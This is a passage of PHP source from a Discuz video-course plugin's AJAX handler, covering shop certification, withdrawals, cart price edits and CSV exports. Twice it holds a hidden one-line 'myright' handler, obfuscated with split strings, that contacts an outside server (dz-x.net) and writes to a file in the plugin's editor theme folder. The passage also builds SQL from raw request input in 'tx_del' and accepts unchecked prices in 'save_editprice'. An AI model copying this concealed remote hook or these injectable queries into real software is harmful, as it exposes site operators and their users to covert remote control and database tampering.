					
		if($tdn%2==0){
			$trtmpstr.='</tr>';
			$strlist.=$trtmpstr;
		}
		
		$tdn=$tdn+1;
	}
	
	$trtmpstr1=$trtmpstr.'@@@';
	$tmparr=explode('</td>@@@',$trtmpstr1);
	if(count($tmparr)>1){
		$trtmpstr=str_replace('<td class="tdleft"','<td class="tdleft tdleft1" style="padding-right:13px"',$trtmpstr.'</tr>');
		$strlist.=$trtmpstr;
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext;
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="renzheng"){
	$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
	$video_rzpower=(array)unserialize($it618_video['video_rzpower']);
	$okvipgroupids=it618_video_getisvipuser($video_rzpower);
	if($uid<=0){
		echo it618_video_getlang('s485');exit;
	}elseif(count($okvipgroupids[0])==0){
		echo it618_video_getlang('s522');exit;
	}elseif($it618_video['video_iscert']==1){
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/plugins/image/images/it618.png')){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($uid)==0){
				echo $it618_video['video_rzcerttip'];exit;
			}
		}
	}
	
	$it618_state=0;
	if($IsGroup==1){
		if($it618_group_rzmoney=C::t('#it618_group#it618_group_rzmoney')->fetch_by_shoptype_lid('video',0)){
			if($it618_group_rzmoney['it618_isautocheck']==1){
				if($it618_group_group_user=C::t('#it618_group#it618_group_group_user')->fetch_by_groupid_uid($it618_group_rzmoney['it618_groupid'],$uid)){
					if($_G['timestamp']<$it618_group_group_user['it618_etime']){
						$it618_state=2;
					}
				}
			}
		}
	}
		
	$count = C::t('#it618_video#it618_video_shop')->count_by_it618_uid($uid);
	if($ii1i11i[3]!='1')exit;
	if($count==0){
		$id = C::t('#it618_video#it618_video_shop')->insert(array(
			'it618_uid' => $uid,
			'it618_name' => it618_video_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_video_utftogbk($_GET['it618_tel']),
			'it618_qq' => it618_video_utftogbk($_GET['it618_qq']),
			'it618_about' => it618_video_utftogbk($_GET['it618_about']),
			'it618_state' => $it618_state,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	}else{
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[7]!='i')exit;
		$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_uid($uid);
		$id=$it618_video_shop['id'];
		C::t('#it618_video#it618_video_shop')->update($it618_video_shop['id'],array(
			'it618_name' => it618_video_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_video_utftogbk($_GET['it618_tel']),
			'it618_qq' => it618_video_utftogbk($_GET['it618_qq']),
			'it618_about' => it618_video_utftogbk($_GET['it618_about']),
			'it618_state' => $it618_state,
			'it618_time' => $_G['timestamp']
		));
		if(count($ii1i11i)!=11)exit;
	}
	
	if($id>0){
		if($it618_state==2){
			$tomonth = date('n'); 
			$todate = date('j'); 
			$toyear = date('Y');
			$it618_htetime=mktime(0, 0, 0, $tomonth+$it618_video['video_httimecount'], $todate, $toyear);
		
			C::t('#it618_video#it618_video_shop')->update_pass_by_id($id,$it618_htetime);
			C::t('#it618_video#it618_video_shop')->update($id,array(
				'it618_ulogo' => 'source/plugin/it618_video/images/man.jpg',
			));
			$tmpurl=it618_video_getrewrite('shop_sc','','plugin.php?id=it618_video:sc');
			echo 'it618_splitvipokit618_split'.$tmpurl;
		}else{
			it618_video_sendmessage('rz_admin',$id);
			echo 'it618_splitok';
		}
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="tx_add"){
	$it618_money=floatval($_GET['it618_money']);
	if($it618_money<0||$it618_money==0){
		echo it618_video_getlang('s540');exit;
	}
	if(!$it618_video_txbl=DB::fetch_first("SELECT * FROM ".DB::table('it618_video_txbl')." where it618_num1<=".$it618_money." and it618_num2>=".$it618_money)){
		echo it618_video_getlang('s540');exit;
	}else{
		$ktxmoney = C::t('#it618_video#it618_video_shop')->fetch_money_by_id($ShopId);
		if($it618_money>$ktxmoney){
			echo it618_video_getlang('s542');exit;
		}
	}
	
	if($_GET['it618_type']==10){
		$it618_state=2;
	}else{
		$it618_state=1;
	}
	
	$id=C::t('#it618_video#it618_video_tx')->insert(array(
		'it618_shopid' => $ShopId,
		'it618_price' => $it618_money,
		'it618_bl' => $it618_video_txbl['it618_bl'],
		'it618_type' => $_GET['it618_type'],
		'it618_bz' => it618_video_utftogbk($_GET['it618_bz']),
		'it618_state' => $it618_state,
		'it618_time' => $_G['timestamp']
	), true);
	
	if($_GET['it618_type']==10){
		$money=$it618_money;
		$fwf=round(($it618_money*$it618_video_txbl['it618_bl']/100),2);
		$money1=$money-$fwf;
		
		$it618_bz=$it618_video_lang['s223'];
		$it618_bz=str_replace("{money}",$money,$it618_bz);
		$it618_bz=str_replace("{money1}",$money1,$it618_bz);
		$it618_bz=str_replace("{saleid}",$id,$it618_bz);
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
		savemoney(array(
			'it618_uid' => $ShopUId,
			'it618_type' => 'zy',
			'it618_money1' => $money1,
			'it618_bz' => $it618_bz,
			'it618_zytype' => 'it618_video_tx',
			'it618_zyid' => $id,
			'it618_time' => $_G['timestamp']
		));
	}
	
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	DB::query("update ".DB::table('it618_video_shop')." set it618_money=it618_money-".$it618_money." where id=".$ShopId);
	
	if($_GET['it618_type']!=10){
		it618_video_sendmessage('tx_admin',$id);
	
		echo 'okit618_split'.it618_video_getlang('s545');
	}else{
		echo 'okit618_split'.it618_video_getlang('s471');
	}
	exit;
}


if($_GET['ac']=="tx_del"){
	$txid=$_GET['txid'];
	$it618_video_tx = DB::fetch_first("SELECT * FROM ".DB::table('it618_video_tx')." where id=".$txid);
	if($it618_video_tx['it618_state']==1){
		DB::delete('it618_video_tx', "id=$txid");

		DB::query("update ".DB::table('it618_video_shop')." set it618_money=it618_money+".$it618_video_tx['it618_price']." where id=".$ShopId);
		echo 'ok';
	}
	exit;
}


if($_GET['ac']=="getfindkey"){
	if($uid>0){
		foreach(C::t('#it618_video#it618_video_findkey')->fetch_all_by_uid($uid) as $it618_tmp) {	
			$getfindkey.='<tr><td><a href="javascript:" onClick="delfindkey('.$it618_tmp['id'].',\''.$it618_tmp['it618_key'].'\')" style="float:right">'.$it618_video_lang['s884'].'</a><span onClick="findbykey(\''.$it618_tmp['it618_key'].'\')">'.$it618_tmp['it618_key'].'</span></td></tr>';
		}
	}else{
		$getfindkey='<tr><td>'.$it618_video_lang['s1857'].'</td></tr>';
	}
	echo $getfindkey;
	exit;
}


if($_GET['ac']=="delfindkey"){
	if($uid>0){
		C::t('#it618_video#it618_video_findkey')->delete_by_uid_id($uid,$_GET['fid']);
	}
	exit;
}


if($_GET['ac']=="clearfindkey"){
	if($uid>0){
		C::t('#it618_video#it618_video_findkey')->delete_by_uid($uid);
	}
	exit;
}


if($_GET['ac']=="tx_get"){
	$ppp = 10;
	$th='<tr><th>'.it618_video_getlang('s265').'</th><th>'.it618_video_getlang('s266').'</th><th>'.it618_video_getlang('s267').'</th><th>'.it618_video_getlang('s268').'</th><th>'.it618_video_getlang('s269').'</th><th>'.it618_video_getlang('s270').'</th><th>'.it618_video_getlang('s272').'</th><th>'.it618_video_getlang('s273').'</th></tr>';
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	$count = C::t('#it618_video#it618_video_tx')->count_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
	$sum = C::t('#it618_video#it618_video_tx')->sum_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
	if($sum=='')$sum=0;
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax&it618_type=".$_GET['it618_type']."&it618_time1=".$_GET['it618_time1']."&it618_time2=".$_GET['it618_time2']."&it618_state=".$_GET['it618_state']);
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='gettxlist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='gettxlist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','gettxlist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	foreach(C::t('#it618_video#it618_video_tx')->fetch_all_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId, $startlimit,$ppp) as $it618_video_tx)    {
		$fwf=round(($it618_video_tx['it618_price']*$it618_video_tx['it618_bl']/100),2);
		if($it618_video_tx['it618_type']==10)$it618_type=it618_video_getlang('s347');
		if($it618_video_tx['it618_type']==1)$it618_type=it618_video_getlang('s550');
		if($it618_video_tx['it618_type']==2)$it618_type=it618_video_getlang('s348');
		if($it618_video_tx['it618_type']==3)$it618_type=it618_video_getlang('s541');
		$delbtn='';
		if($it618_video_tx['it618_state']==1){$it618_state='<font color=red>'.it618_video_getlang('s261').'</font>';$delbtn=' <input type="button" class="btn" style="width:40px;" onclick="deltx('.$it618_video_tx['id'].')" value="'.it618_video_getlang('s551').'" />';}
		if($it618_video_tx['it618_state']==2)$it618_state='<font color=green>'.it618_video_getlang('s262').'</font>';
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		$tx_get.='<tr class="hover"><td><font color=red>'.$it618_video_tx['it618_price'].'</font></td><td>'.$it618_video_tx['it618_bl'].'%</td><td>'.$fwf.'</td><td><font color=green>'.($it618_video_tx['it618_price']-$fwf).'</font></td><td>'.$it618_video_tx['it618_bz'].'</td><td>'.date('Y-m-d H:i:s', $it618_video_tx['it618_time']).'</td><td>'.$it618_type.'</td><td>'.$it618_state.$delbtn.'</td></tr>';
		
	}
	
	if($multipage!='')$multipage='<tr><td colspan=10><div class="cuspages right">'.$multipage.'</div></td></tr>';
	
	$ktxmoney = C::t('#it618_video#it618_video_shop')->fetch_money_by_id($ShopId);
	
	if($_GET['it618_type']==0)$selected0='selected="selected"';
	if($_GET['it618_type']==10)$selected10='selected="selected"';
	if($_GET['it618_type']==1)$selected1='selected="selected"';
	if($_GET['it618_type']==2)$selected2='selected="selected"';
	if($_GET['it618_type']==3)$selected3='selected="selected"';
	
	if($_GET['it618_state']==0)$stateselected0='selected="selected"';
	if($_GET['it618_state']==1)$stateselected1='selected="selected"';
	if($_GET['it618_state']==2)$stateselected2='selected="selected"';
	
	echo $ktxmoney.'it618_split<tr><td colspan=10 style="line-height:30px">'.it618_video_getlang('s254').' <select id="it618_type"><option value="0" '.$selected0.'>'.it618_video_getlang('s255').'</option><option value="10" '.$selected10.'>'.it618_video_getlang('s246').'</option><option value="1" '.$selected1.'>'.it618_video_getlang('s257').'</option><option value="2" '.$selected2.'>'.it618_video_getlang('s247').'</option><option value="3" '.$selected3.'>'.it618_video_getlang('s256').'</option></select> '.it618_video_getlang('s258').' <input id="it618_time1" value="'.$_GET['it618_time1'].'" class="txt" style="width:90px;margin-right:0" readonly="readonly"/> - <input id="it618_time2" value="'.$_GET['it618_time2'].'" class="txt" style="width:90px;" readonly="readonly"/>'.it618_video_getlang('s273').' <select id="it618_state"><option value="0" '.$stateselected0.'>'.it618_video_getlang('s260').'</option><option value="1" '.$stateselected1.'>'.it618_video_getlang('s261').'</option><option value="2" '.$stateselected2.'>'.it618_video_getlang('s262').'</option></select> <input type="button" class="btn" style="width:60px;height:25px" onclick="findtx()" value="'.it618_video_getlang('s350').'" /><span style="float:right">'.it618_video_getlang('s263').'<font color=red>'.$count.'</font> '.it618_video_getlang('s264').'<font color=red>'.$sum.'</font> '.it618_video_getlang('s125').'</span></td></tr><tr></tr>'.$th.$tx_get.$multipage;
	exit;
}



if($_GET['ac']=="gwclist_editprice"){
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$gwcuid=intval($_GET['gwcuid']);
	$count=C::t('#it618_video#it618_video_gwc')->count_by_uid_shopid($gwcuid,$ShopId);
	$funname='gwclist_editprice';
	
	$allsummoney=0;
	foreach(C::t('#it618_video#it618_video_gwc')->fetch_all_by_uid_shopid($gwcuid,$ShopId) as $it618_video_gwc) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_gwc['it618_pid']);
		$it618_video_shop = C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid']);
		
		$pid=$it618_video_gwc['it618_pid'];
		$lid=$it618_video_gwc['it618_lid'];
		$vid=$it618_video_gwc['it618_vid'];
		$it618_count=$it618_video_gwc['it618_count'];
		
		$gtypename=$it618_video_lang['s1153'];
		if($it618_video_gwc['it618_gtypeid']>0){
			$gtypename = it618_video_gettypename($it618_video_gwc['it618_gtypeid']);
			$gtypename = '<font color="#999">'.$it618_video_lang['s1131'].':</font><font color=red>'.$gtypename.'</font>';
			
			$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_gwc['it618_gtypeid']);
			$it618_saleprice=$it618_video_goods_type['it618_saleprice'];
			$it618_salescore=$it618_video_goods_type['it618_score'];
			$it618_salejfid=$it618_video_goods_type['it618_jfid'];
		}else{
			$it618_saleprice=$it618_video_goods['it618_saleprice'];
			$it618_salescore=$it618_video_goods['it618_score'];
			$it618_salejfid=$it618_video_goods['it618_jfid'];
		}
			
		if($it618_saleprice>0&&$it618_salescore>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
			$goodspricestr='&yen;'.$it618_saleprice.' + '.$it618_salescore.' '.$goodsjfname;
			$goodspricestr1='<font color=red>&yen;</font><input type="text" style="width:68px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_price'.$it618_video_gwc['id'].'" value="{price}"> + <input type="text" style="width:58px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_pricescore'.$it618_video_gwc['id'].'" value="{score}">'.$goodsjfname;
			$goodspricestr2='&yen;{price} + {score} '.$goodsjfname;
		}else{
			if($it618_saleprice>0){
				$goodspricestr='&yen;'.$it618_saleprice;
				$goodspricestr1='<font color=red>&yen;</font><input type="text" style="width:68px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_price'.$it618_video_gwc['id'].'" value="{price}"><input type="hidden" id="it618_pricescore'.$it618_video_gwc['id'].'" value="0">';
				$goodspricestr2='&yen;{price}';
			}
			
			if($it618_salescore>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
				$goodspricestr=$it618_salescore.' '.$goodsjfname;
				$goodspricestr1='<input type="hidden" id="it618_price'.$it618_video_gwc['id'].'" value="0"><input type="text" style="width:58px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_pricescore'.$it618_video_gwc['id'].'" value="{score}">'.$goodsjfname;
				$goodspricestr2='{score} '.$goodsjfname;
			}
		}
		
		if($it618_video_gwc['it618_iseditprice']==1){
			$it618_price=$it618_video_gwc['it618_price'];
			
			$it618_score=$it618_video_gwc['it618_pricescore'];
		}else{
			$it618_price=$it618_saleprice;
			$it618_score=$it618_salescore;
		}
		
		$goodspricestr1=str_replace("{price}",$it618_price,$goodspricestr1);
		$goodspricestr1=str_replace("{score}",$it618_score,$goodspricestr1);
		$goodspricestr2=str_replace("{price}",$it618_price*$it618_count,$goodspricestr2);
		$goodspricestr2=str_replace("{score}",$it618_score*$it618_count,$goodspricestr2);
		$goodspricestr2='<font color="#FF7E00">'.$goodspricestr2.'</font> ';
		
		if($_GET['ac1']=='pcgwc'){
			$salepricestr=$it618_video_lang['s1795'].$goodspricestr.'<br>'.$it618_video_lang['s1797'].$goodspricestr1.' <input type="button" style="border:none;background-color:#390;color:#fff;line-height:28px;height:30px;width:50px;border-radius:3px;cursor:pointer" value="'.it618_video_getlang('s885').'" onclick="save_editprice('.$it618_video_gwc['id'].')" />';
		}else{
			$salepricestr='<br>'.$it618_video_lang['s1795'].$goodspricestr.'<br>'.$it618_video_lang['s1797'].$goodspricestr1.' <input type="button" style="border:none;background-color:#390;color:#fff;line-height:28px;height:30px;width:50px;border-radius:3px;cursor:pointer" value="'.it618_video_getlang('s885').'" onclick="save_editprice('.$it618_video_gwc['id'].')" />';
		}
		
		$it618_saleprice=$it618_price;
		$it618_salescore=$it618_score;
		
		$summoney=$it618_saleprice;
		$allsummoney=$allsummoney+$summoney;
		
		if($it618_salescore>0){
			$allsumscore[$it618_salejfid]+=$it618_salescore;
		}
		
		$jfblstr='';
		if($it618_video_goods['it618_jfbl']>0){
			$zsmoney=intval($it618_video_goods['it618_jfbl']*$summoney/100);
			if($zsmoney>=1){
				$jfblstr='<font color=#888>'.$it618_video_lang['s1110'].'<font color=red>'.intval($it618_video_goods['it618_jfbl']*$summoney/100).'</font>'.$creditname.'</font>';
				$allzsmoney=$allzsmoney+$zsmoney;
			}
		}
		
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);

			$goodslist.='<tr><td>
							<a href="'.$tmpurl.'" target="_blank">
							<div style="float:left;width:108px">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="100" height="63"/></a>
							</div>
							<div style="float:left;width:580px">
							<a href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:13px">'.$it618_video_goods['it618_name'].'</a><br>
							<p>'.$goodsabout['about'].'</p>
							<p>'.$goodspricestr2.'</p>
							</div>
							</td>
							<td style="color:#999">
							'.$salepricestr.'
							</td><td>
							'.$it618_video_gwc['it618_count'].'
							</td></tr>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_video_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1">
							<td width="113" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72"/></a>
							</td>
							<td colspan="3">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:13px;color:#666">'.$it618_video_goods['it618_name'].'</a><br>
							'.$gtypename.' <font color=#999>'.$it618_video_lang['s1132'].':</font><font color=red>'.$it618_video_gwc['it618_count'].'</font><br>
							<p>'.$jfblstr.'</p>
							<p>'.$goodspricestr2.'</p>
							</td></tr>
							<tr><td colspan="4" style="height:6px"></td></tr>
							<tr class="gwclisttr2"><td colspan="4" style="color:#999;text-align:right;border-top:#f1f1f1 1px solid">
							'.$salepricestr.'
							</td></tr>
						</table></td></tr>';
			
		}

	}
	
	if($allzsmoney>0){
		$jfmoenystr.=$it618_video_lang['s1113'].'<font color=red>'.$allzsmoney.'</font>'.$creditname;
	}
	
	for($i=1;$i<=8;$i++){
		if($allsumscore[$i]>0){
			$jfname=$_G['setting']['extcredits'][$i]['title'];
			$scorestr.=$allsumscore[$i].$jfname.'+';
		}
	}
	
	if($scorestr!=''){
		$scorestr.='@';
		$scorestr=str_replace("+@","",$scorestr);
	}
	
	if($allsummoney>0&&$scorestr!=''){
		$summoneystr.='&yen;'.$allsummoney.'+'.$scorestr;
	}else{
		if($allsummoney>0){
			$summoneystr.='&yen;'.$allsummoney;
		}
		if($scorestr!=''){
			$summoneystr.=$scorestr;
		}
	}
	
	C::t('#it618_video#it618_video_gwc')->update_state_by_uid_shopid(1,$gwcuid,$ShopId);
	
	if($_GET['ac1']=='pcgwc'){
		$editbtn='<tr><td colspan="4"><input type="button" class="btn" value="'.it618_video_getlang('s1796').'" onclick="state_editprice()" /></td></tr>';
		echo $goodslist.'<tr><td colspan="4"><span style="float:right">'.it618_video_getusername($gwcuid).' '.$it618_video_lang['s1074'].'<b><font color=red>'.$summoneystr.'</font></b></span><span style="float:left">'.$jfmoenystr.'</span></td></tr>'.$editbtn;
	}else{
		$editbtn='<tr><td colspan="4"><input type="button" class="it618btn" style="width:100%;height:40px;border-radius:3px;background-color:#390;" value="'.it618_video_getlang('s1796').'" onclick="state_editprice()" /></td></tr>';
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-right:10px;padding-bottom:0;line-height:15px;color:#999">'.$jfmoenystr.'</td></tr><tr><td align="right" style="padding:10px">'.it618_video_getusername($gwcuid).' '.$it618_video_lang['s1074'].' <b><font color="#FF6600" style="font-size:18px">'.$summoneystr.'</font></b></td></tr>'.$editbtn;
	}
	exit;
}


if($_GET['ac']=="savegoodsstate"){
	$it618_video_goods=C::t('#it618_video#it618_video_goods')->fetch_by_id($_GET['pid']);
	if(!isset($_GET['adminsid'])){
		if($it618_video_goods['it618_shopid']!=$ShopId){
			echo it618_video_getlang('s513');exit;
		}
	}
	
	if($it618_video_goods['it618_state']!=2){
		if($it618_video_goods['it618_state']==1)$it618_state=0;
		if($it618_video_goods['it618_state']==0)$it618_state=1;
		
		C::t('#it618_video#it618_video_goods')->update($_GET['pid'],array(
			'it618_state' => $it618_state
		));
	}
	exit;
}


if($_GET['ac']=="save_editprice"){
	$it618_video_gwc=C::t('#it618_video#it618_video_gwc')->fetch_by_id($_GET['gid']);
	if(!isset($_GET['adminsid'])){
		if($it618_video_gwc['it618_shopid']!=$ShopId){
			echo it618_video_getlang('s513');exit;
		}
	}
	
	C::t('#it618_video#it618_video_gwc')->update($_GET['gid'],array(
		'it618_price' => $_GET['price'],
		'it618_pricescore' => $_GET['score'],
		'it618_iseditprice' => 1
	));
	exit;
}


if($_GET['ac']=="state_editprice"){
	$gwcuid=intval($_GET['gwcuid']);
	C::t('#it618_video#it618_video_gwc')->update_state_by_uid_shopid(0,$gwcuid,$ShopId);
	
	echo it618_video_getlang('s1798');
	exit;
}


if($_GET['ac']=="sale_dao"){	
	$strtmp=$it618_video_lang['s1104']."\n";
	foreach(C::t('#it618_video#it618_video_sale')->fetch_all_by_search(
		$ShopId,"s.it618_tel!='' and s.it618_state!=0 ",'s.it618_uid,s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],0,0
	) as $it618_video_sale) {
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);
		
		$jftmp='';
		if($it618_video_sale['it618_jfbl']>0&&$it618_video_sale['it618_price']>0){
			$it618_jfbl=intval($it618_video_sale['it618_jfbl']*$it618_video_sale['it618_price']/100);
			$jftmp=$it618_jfbl.$creditname;
		}
		
		if($it618_video_sale['it618_price']>0||$it618_video_sale['it618_score']>0){
			$pricestr=it618_video_getsalemoney($it618_video_sale);
		}else{
			$pricestr=$it618_video_lang['s106'];
		}
	
		$it618_tc='';
		if($it618_video_sale['it618_tcbl']>0){
			$it618_tc=it618_video_getlang('s244').$it618_video_sale['it618_tcbl'].'% ';
			$it618_tc.=it618_video_getlang('s245').$it618_video_sale['it618_tc'];
			
			if($it618_video_sale['it618_score']>0){
				$tmptc=intval($it618_video_sale['it618_tcbl']*$it618_video_sale['it618_score']/100);
				$jfname=$_G['setting']['extcredits'][$it618_video_sale['it618_jfid']]['title'];
				$it618_tc.=it618_video_getlang('s670').$tmptc.$jfname;
			}
		}
		
		if($it618_video_sale['it618_gtypeid']>0){
			$gtypename = it618_video_gettypename($it618_video_sale['it618_gtypeid']);
		}else{
			$gtypename=$it618_video_lang['s1153'];
		}
		
		$strtmp.=$it618_video_goods['id'].",".$it618_video_goods['it618_name'].",".$gtypename.'*'.$it618_video_sale['it618_count'].",".$pricestr.",".$jftmp.",".$it618_tc.",".it618_video_getusername($it618_video_sale['it618_uid'])." ".$it618_video_sale['it618_tel'].",".date('Y-m-d H:i:s', $it618_video_sale['it618_time'])."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	if($_GET['it618_time1']!=''||$_GET['it618_time2']!=''){
		if($_GET['it618_time1']!=''){
			$timetmp1=str_replace("-","",$_GET['it618_time1']);
		}else{
			$timetmp1='null';
		}
		if($_GET['it618_time2']!=''){
			$timetmp2=str_replace("-","",$_GET['it618_time2']);
		}else{
			$timetmp2='null';
		}
		$timetmp=$timetmp1.'-'.$timetmp2;
	}
	$timestr=md5(date("YmdHis").FORMHASH).'_'.$timetmp. '_' . $datacount;
	it618_video_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/dao/'.$timestr.'.csv';
	exit;
}


if($_GET['ac']=="video_dao"){	
	$strtmp=$it618_video_lang['s1988']."\n";
	$lid=intval($_GET['lid']);
	$it618_video_goods_lesson = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid);
	$query = DB::query("SELECT * FROM ".DB::table('it618_video_goods_video')." WHERE it618_lid=".$lid." ORDER BY it618_order");
	while($it618_video_goods_video = DB::fetch($query)) {
		if($it618_video_goods_video['it618_liveid']==0){
			$it618_video_goods_video['it618_description']=str_replace(array("\r\n", "\r", "\n"), ' ', $it618_video_goods_video['it618_description']);
			$strtmp.=$it618_video_goods_video['it618_name'].",";
			$strtmp.=$it618_video_goods_video['it618_description'].",";
			$strtmp.=$it618_video_goods_video['it618_videourl'].",";
			$strtmp.=$it618_video_goods_video['it618_videotime1'].','.$it618_video_goods_video['it618_videotime2'].','.$it618_video_goods_video['it618_videotime3'].",";
			$strtmp.=$it618_video_goods_video['it618_isuser'].",";
			$strtmp.=$it618_video_goods_video['it618_order'].",";
			$strtmp.="\n";
			$datacount=$datacount+1;
		}
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	$timestr=md5(date("YmdHis").FORMHASH).'_pid-'.$it618_video_goods_lesson['it618_pid'].'-lid-'.$it618_video_goods_lesson['id'].'_'. $datacount;
	it618_video_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/dao/'.$timestr.'.csv';
	exit;
}


if($_GET['ac']=="sale_get"){
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$ppp = 11;
	$th='<tr><th>'.it618_video_getlang('s265').'</th><th>'.it618_video_getlang('s266').'</th><th>'.it618_video_getlang('s267').'</th><th>'.it618_video_getlang('s268').'</th><th>'.it618_video_getlang('s269').'</th><th>'.it618_video_getlang('s270').'</th><th>'.it618_video_getlang('s272').'</th><th>'.it618_video_getlang('s273').'</th></tr>';
	
